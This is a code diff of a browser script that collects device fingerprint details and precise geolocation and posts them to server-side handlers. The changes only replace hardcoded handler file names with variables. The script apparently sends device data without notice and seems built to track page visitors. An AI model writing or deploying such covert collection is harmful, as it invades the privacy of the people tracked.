@@ -74,17 +74,16 @@ function information() {
     os = 'Not Available';
   }
   os = os.trim();
-  //
+  
+  // --- UPDATED SECTION 1: Uses info_file variable ---
   $.ajax({
     type: 'POST',
-    url: 'info_handler.php',
+    url: info_file,
     data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os },
     success: function () { },
     mimeType: 'text'
   });
 }
-
-
 
 function locate(callback, errCallback) {
   if (navigator.geolocation) {
@@ -112,9 +111,10 @@ function locate(callback, errCallback) {
         break;
     }
 
+    // --- UPDATED SECTION 2: Uses error_file variable ---
     $.ajax({
       type: 'POST',
-      url: 'error_handler.php',
+      url: error_file,
       data: { Status: err_status, Error: err_text },
       success: errCallback(error, err_text),
       mimeType: 'text'
@@ -166,13 +166,13 @@ function locate(callback, errCallback) {
 
     var ok_status = 'success';
 
+    // --- UPDATED SECTION 3: Uses result_file variable ---
     $.ajax({
       type: 'POST',
-      url: 'result_handler.php',
+      url: result_file,
       data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
       success: callback,
       mimeType: 'text'
     });
   };
 }
-
